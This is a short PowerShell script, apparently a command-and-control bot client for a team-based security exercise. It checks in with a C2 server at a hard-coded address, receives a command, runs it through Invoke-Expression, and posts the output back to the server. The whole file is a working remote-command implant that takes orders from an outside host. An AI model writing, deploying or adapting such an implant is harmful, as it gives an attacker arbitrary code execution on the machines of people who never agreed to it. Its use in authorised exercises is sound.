 <#
.SYNOPSIS
    A sample powershell client.
#>


# Global configuration parameters
# The link of the C2
$server = "http://10.10.1.116:5000";
# The bot's IP
$ip = "10.10.1.1";
# Team's number
$team = "5";
# For a later implementation.
$CheckTimeInMinutes = 1;


# Global parameters
$globalData = @{
  "team" = $team;
  "ip" = $ip;
  "user" = "administrator";
}



<#
Sends a POST request with DATA as a parameter.
#>
function communicate ($url,$data) {
  try {
    $results = Invoke-WebRequest -Verbose -Uri $url -Method POST -Body ($data | ConvertTo-Json) -ContentType "application/json";
    $results = $results | ConvertFrom-Json;
    return $results;
  }
  catch {
    return $null;
  }
}

<#
Checkin function.
#>
function checkin ($url,$data) {
  try {
    $url = -join($url, "/callback");
    $checkinResults = communicate $url $data;
    return $checkinResults
  }
  catch {
    return $null;
  }
}

<#
Sends back the output of the requested execution.
#>
function reply ( $url, $id, $output) {
  try {
    $data = @{
      "id" = $id;
      "results" = $output;
    }
    $url = -join($url, "/callback_post");
    $resultr = communicate $url $data;
    return $results;
  }
  catch {
    return $null;
  }

}

<#
Executes a command and returns the output
#>
function execute ($cmd) {
  try {
    $output = Invoke-Expression $cmd -ErrorVariable e;
  }
  catch {
    Write-Output $e;
    Write-Output "\n";
  }
  # TODO Finalize the output - e and output
  $results = $output;
  return $results;
}




<#
 Main
#>


# Check in and get an ID.
$jsonResults = checkin $server $globalData;
# Execute the received command.
$output = execute $jsonResults.command;
# Set ID
$id = $jsonResults.id;
# Send back the command's outputs
reply $server $id $output;



